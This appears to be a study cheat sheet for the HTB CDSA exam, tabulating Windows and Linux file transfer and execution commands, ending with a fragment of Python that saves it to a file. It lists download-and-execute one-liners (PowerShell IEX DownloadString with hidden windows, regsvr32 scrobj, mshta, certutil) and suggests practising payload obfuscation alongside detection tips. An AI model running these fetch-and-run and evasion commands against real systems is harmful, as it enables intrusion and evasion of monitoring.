
## Introduction
This reference guide provides a comprehensive overview of file transfer and execution techniques relevant to the HTB Certified Defensive Security Analyst (CDSA) exam. It is organized by platform and method, with detailed command usage, descriptions, and modifiers to assist in both offensive and defensive contexts.

---

## Windows: PowerShell-Based Transfers & Execution

| Command | Description | Modifiers / Notes |
|--------|-------------|-------------------|
| `Invoke-WebRequest -Uri <URL> -OutFile <filename>` | Downloads a file from a URL | Use `-UseBasicParsing` for older PowerShell versions |
| `Invoke-Expression (New-Object Net.WebClient).DownloadString('<URL>')` | Executes script directly from web | Avoids disk writes; useful for in-memory execution |
| `powershell -command "IEX(New-Object Net.WebClient).DownloadString('<URL>')"` | One-liner for remote script execution | Can be obfuscated for evasion |
| `Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File script.ps1'` | Executes PowerShell script with bypass | Useful for executing downloaded scripts |

---

## Windows: Native Transfer Tools

| Command | Description | Modifiers / Notes |
|--------|-------------|-------------------|
| `certutil -urlcache -split -f <URL> <filename>` | Downloads file using certutil | Commonly used by attackers; may be monitored |
| `bitsadmin /transfer myDownloadJob /download /priority high <URL> <filename>` | Uses BITS to download file | Deprecated but still functional on some systems |
| `ftp -s:script.txt` | Executes FTP commands from file | Requires pre-written script file |
| `copy \<IP>\share\file.exe .` | Copies file from SMB share | Requires share access and permissions |

---

## Linux: File Transfers & Execution

| Command | Description | Modifiers / Notes |
|--------|-------------|-------------------|
| `wget <URL>` | Downloads file from web | Use `--no-check-certificate` to bypass SSL errors |
| `curl -O <URL>` | Downloads file with original name | Use `-L` to follow redirects |
| `scp user@host:/path/to/file .` | Secure copy from remote host | Requires SSH access |
| `rsync -avz user@host:/path/to/file .` | Sync files from remote host | Preserves permissions and timestamps |
| `chmod +x file && ./file` | Makes file executable and runs it | Common for script execution |

---

## Cross-Platform Transfer Methods

| Command | Description | Modifiers / Notes |
|--------|-------------|-------------------|
| `python -m http.server 8080` | Serves files over HTTP | Works on both Windows and Linux |
| `nc -lvp 4444 > file` | Receive file via netcat | Use `nc -w 3` for timeout control |
| `echo -n '<base64>' | base64 -d > file` | Transfers via base64 encoding | Useful for clipboard or text-based transfer |
| `scp file user@host:/path` | Secure copy to remote host | Requires SSH access |

---

## Evasion & In-Memory Execution

| Command | Description | Modifiers / Notes |
|--------|-------------|-------------------|
| `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('<URL>')"` | Executes script in memory | `-nop` disables profile; `-w hidden` hides window |
| `regsvr32 /s /n /u /i:http://<URL>/script.sct scrobj.dll` | Executes remote script via COM | Fileless technique; often used in red teaming |
| `mshta http://<URL>/payload.hta` | Executes HTA application remotely | Can be used for GUI-based payloads |
| `rundll32 <dll>,<export>` | Executes DLL function | Requires knowledge of export name |

---

## HTB CDSA Tips

- Always verify file integrity using hashes (e.g., `Get-FileHash`, `sha256sum`).
- Monitor native tools like `certutil`, `bitsadmin`, and `regsvr32` for suspicious activity.
- Use Sysmon and Windows Event Logs to detect in-memory execution and script downloads.
- Practice obfuscation techniques for PowerShell and HTA payloads.
- Understand how attackers use living-off-the-land binaries (LOLBins) for stealth.
- Test all commands in lab environments before using in production or exams.

---

This reference is designed to support HTB CDSA candidates in mastering file transfer and execution techniques across platforms.
"""

# Save the markdown file
output_path = "/mnt/data/HTB_CDSA_File_Transfer_Reference.md"
Path(output_path).write_text(markdown_content)

output_path
